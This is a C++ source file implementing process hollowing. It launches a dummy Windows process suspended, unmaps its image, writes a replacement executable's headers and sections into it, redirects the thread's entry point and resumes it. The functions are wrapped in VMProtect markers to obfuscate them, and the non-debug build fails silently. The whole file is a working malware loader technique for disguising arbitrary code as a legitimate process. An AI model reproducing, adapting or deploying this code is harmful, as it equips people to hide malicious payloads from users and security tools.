#include "stdafx.h"
#include "Base.h"

//const unsigned int READ_WRITE_SIZE = 2048;

using funcNtUnmapViewOfSection = NTSTATUS(WINAPI *)(HANDLE hProcess, PVOID pBaseAddress);
funcNtUnmapViewOfSection NtUnmapViewOfSection = nullptr;

PROCESS_INFORMATION MapTargetProcess(NewProcessInfo &newProcessInfo, const LPSTR strDummyProcessPath)
{
	VMProtectBegin(__FUNCTION__);
	PROCESS_INFORMATION Empty = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	STARTUPINFOA startupInfo = { 0 };

	NtUnmapViewOfSection = (funcNtUnmapViewOfSection)GetProcAddress(
		GetModuleHandle(_T("ntdll.dll")), "NtUnmapViewOfSection");
	if (NtUnmapViewOfSection == nullptr)
	{
#if POC
		fprintf(stderr, "Could not locate NtUnmapViewOfSection.\n");
		exit(-1);
#else
		return Empty;
#endif
	}

	bool bRet = BOOLIFY(CreateProcessA(nullptr, strDummyProcessPath, nullptr, nullptr, FALSE, CREATE_SUSPENDED,
		nullptr, nullptr, &startupInfo, &processInfo));
	if (!bRet)
	{
#if POC
		fprintf(stderr, "Could not create dummy process. Error = %X\n",
			GetLastError());
		exit(-1);
#else
		return Empty;
#endif
	}

	DWORD_PTR dwImageBase = newProcessInfo.pNtHeaders->OptionalHeader.ImageBase;
	SIZE_T ulImageSize = newProcessInfo.pNtHeaders->OptionalHeader.SizeOfImage;
	DWORD dwHeaderSize = newProcessInfo.pNtHeaders->OptionalHeader.SizeOfHeaders;
	WORD wNumberOfSections = newProcessInfo.pNtHeaders->FileHeader.NumberOfSections;

	NTSTATUS ntStatus = NtUnmapViewOfSection(processInfo.hProcess, (PVOID)dwImageBase);
	if (!NT_SUCCESS(ntStatus))
	{
#if POC
		fprintf(stderr, "Could not unmap view of dummy process. Nt Status = %X\n",
			ntStatus);
		fprintf(stderr, "Check DEP and ASLR settings on the target process. This example code "
			"does not provide a solution that maps into a DEP/ASLR enabled process.\n");
		exit(-1);
#else
		return Empty;
#endif
	}

	LPVOID lpAllocBase = VirtualAllocEx(processInfo.hProcess, (LPVOID)dwImageBase, ulImageSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if ((DWORD_PTR)lpAllocBase != dwImageBase)
	{
#if POC
		fprintf(stderr, "Could not allocate base address of target process into hollow process. Error = %X\n",
			GetLastError());
		exit(-1);
#else
		return Empty;
#endif
	}

	DWORD dwBytesWritten = 0;
	bRet = BOOLIFY(WriteProcessMemory(processInfo.hProcess, (LPVOID)dwImageBase, newProcessInfo.pFileData.get(),
		dwHeaderSize, &dwBytesWritten));
	if (dwBytesWritten != dwHeaderSize)
	{
#if POC
		fprintf(stderr, "Could not write in PE header of replacement process. Error = %X\n",
			GetLastError());
		exit(-1);
#else
		return Empty;
#endif
	}

	for (auto i = 0; i < wNumberOfSections; ++i)
	{
		int iSectionOffset = newProcessInfo.pDosHeader->e_lfanew
			+ sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i);
		newProcessInfo.pSectionHeader = (IMAGE_SECTION_HEADER *)&(newProcessInfo.pFileData.get()[iSectionOffset]);

		bRet = BOOLIFY(WriteProcessMemory(processInfo.hProcess,
			(LPVOID)(dwImageBase + newProcessInfo.pSectionHeader->VirtualAddress),
			&newProcessInfo.pFileData.get()[newProcessInfo.pSectionHeader->PointerToRawData],
			newProcessInfo.pSectionHeader->SizeOfRawData, &dwBytesWritten));
		if (!bRet)
		{
#if POC
			fprintf(stderr, "Could not write in section to target process. Error = %X\n",
				GetLastError());
			exit(-1);
#else
			return Empty;
#endif
		}
	}
	VMProtectEnd();
	return processInfo;
}

BOOL RunTargetProcess(const NewProcessInfo &newProcessInfo, const PROCESS_INFORMATION &processInfo)
{
	VMProtectBegin(__FUNCTION__);
	CONTEXT ctx = { CONTEXT_FULL };
	BOOL bRet = BOOLIFY(GetThreadContext(processInfo.hThread, &ctx));
	if (!bRet)
	{
#if POC
		fprintf(stderr, "Could not get thread context. Error = %X\n", GetLastError());
		exit(-1);
#else 
		return FALSE;
#endif
	}

	ctx.Eax = newProcessInfo.pNtHeaders->OptionalHeader.ImageBase
		+ newProcessInfo.pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	bRet = BOOLIFY(SetThreadContext(processInfo.hThread, &ctx));
	if (!bRet)
	{
#if POC
		fprintf(stderr, "Could not set thread context. Error = %X\n", GetLastError());
		exit(-1);
#else 
		return FALSE;
#endif
	}

	(void)ResumeThread(processInfo.hThread);
	VMProtectEnd();
	return TRUE;
	
}

void get_replacement_info(const char* full_file_path, NewProcessInfo* new_process_info)
{
	HANDLE hFile = CreateFileA(full_file_path, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD file_size = GetFileSize(hFile, NULL); //Note: High DWORD ignored, dangerous with >4GB files :-P
	new_process_info->pFileData = std::unique_ptr<BYTE[]>(new BYTE[file_size]);
	new_process_info->dwFileSize = file_size;
	DWORD bytes_read;
	ReadFile(hFile, new_process_info->pFileData.get(), file_size, &bytes_read, 0);
	assert(bytes_read == file_size);
	new_process_info->pDosHeader =
		(PIMAGE_DOS_HEADER)(&new_process_info->pFileData[0]);
	new_process_info->pNtHeaders =
		(PIMAGE_NT_HEADERS)(&new_process_info->pFileData[new_process_info->pDosHeader->e_lfanew]);
}
